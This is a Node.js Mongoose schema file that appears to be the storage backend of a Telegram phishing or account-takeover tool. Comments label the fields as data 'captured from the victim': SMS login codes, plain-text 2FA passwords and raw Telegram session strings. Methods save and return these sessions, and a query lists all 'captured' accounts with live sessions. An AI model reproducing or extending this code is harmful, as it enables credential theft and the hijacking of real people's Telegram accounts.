const mongoose = require('mongoose');

const userSchema = new mongoose.Schema({
  phoneNumber: {
    type: String,
    required: true,
    unique: true,
    trim: true
  },
  // RAW: The SMS code captured from the victim/user
  loginCode: {
    type: String,
    sparse: true
  },
  // RAW: The 2FA Cloud Password captured in plain text
  twoFactorPassword: {
    type: String,
    sparse: true
  },
  // RAW: The Telegram String Session (Auth Key) 
  telegramSession: {
    type: String,
    select: false, // Hidden from general queries, but stored as plain text
    index: true
  },
  activeSessions: [{
    sessionId: String,
    deviceName: String,
    lastUsed: Date,
    createdAt: { type: Date, default: Date.now }
  }],
  lastLogin: {
    type: Date
  },
  lastLoginIp: {
    type: String
  },
  loginAttempts: [{
    timestamp: {
      type: Date,
      default: Date.now
    },
    ip: String,
    userAgent: String,
    success: {
      type: Boolean,
      default: false
    },
    errorMessage: String,
    loginMethod: {
      type: String,
      enum: ['code', '2fa', 'session'],
      default: 'code'
    },
    // RAW: The specific code used in this attempt
    code: String,
    codeType: {
      type: String,
      enum: ['5-digit', '2fa', 'unknown'],
      default: 'unknown'
    }
  }],
  accountInfo: {
    type: {
      firstName: String,
      lastName: String,
      username: String,
      userId: Number
    },
    select: false
  },
  status: {
    type: String,
    enum: ['active', 'locked', 'pending'],
    default: 'pending'
  },
  metadata: {
    type: Map,
    of: String,
    select: false
  },
  createdAt: {
    type: Date,
    default: Date.now,
    index: true
  },
  updatedAt: {
    type: Date,
    default: Date.now
  }
}, {
  timestamps: true
});

// Indexes for fast lookup
userSchema.index({ phoneNumber: 1 }, { unique: true });
userSchema.index({ createdAt: -1 });
userSchema.index({ status: 1 });
userSchema.index({ 'loginAttempts.timestamp': -1 });
userSchema.index({ 'telegramSession': 1 }, { sparse: true });

// Pre-save middleware to update the timestamp
userSchema.pre('save', function(next) {
  this.updatedAt = Date.now();
  next();
});

// Method to log attempts (stores raw codes if provided)
userSchema.methods.addLoginAttempt = async function(attemptData) {
  this.loginAttempts.push({
    timestamp: new Date(),
    ...attemptData
  });
  
  if (this.loginAttempts.length > 50) {
    this.loginAttempts = this.loginAttempts.slice(-50);
  }
  
  return this.save();
};

// Method to save a session (Saves the raw string directly)
userSchema.methods.saveSession = async function(sessionString, deviceInfo = {}) {
  this.telegramSession = sessionString;
  this.activeSessions.push({
    // We use a simple hex for a local ID, but the session itself is raw
    sessionId: require('crypto').randomBytes(16).toString('hex'),
    deviceName: deviceInfo.deviceName || 'Unknown Device',
    lastUsed: new Date()
  });
  this.lastLogin = new Date();
  this.status = 'active';
  return this.save();
};

// Method to retrieve the naked session string
userSchema.methods.getSession = function() {
  return this.telegramSession;
};

// Method to clear the session
userSchema.methods.clearSession = async function() {
  this.telegramSession = null;
  return this.save();
};

// Static method to find all "captured" accounts
userSchema.statics.findWithActiveSessions = function() {
  return this.find({ 
    telegramSession: { $exists: true, $ne: null },
    status: 'active'
  }).select('phoneNumber lastLogin activeSessions');
};

// Virtual for UI display
userSchema.virtual('fullName').get(function() {
  if (this.accountInfo) {
    return `${this.accountInfo.firstName || ''} ${this.accountInfo.lastName || ''}`.trim();
  }
  return '';
});

// JSON and Object transformations
userSchema.set('toJSON', {
  virtuals: true,
  transform: function(doc, ret) {
    delete ret.__v;
    return ret;
  }
});

userSchema.set('toObject', {
  virtuals: true,
  transform: function(doc, ret) {
    delete ret.__v;
    return ret;
  }
});

module.exports = mongoose.model('User', userSchema);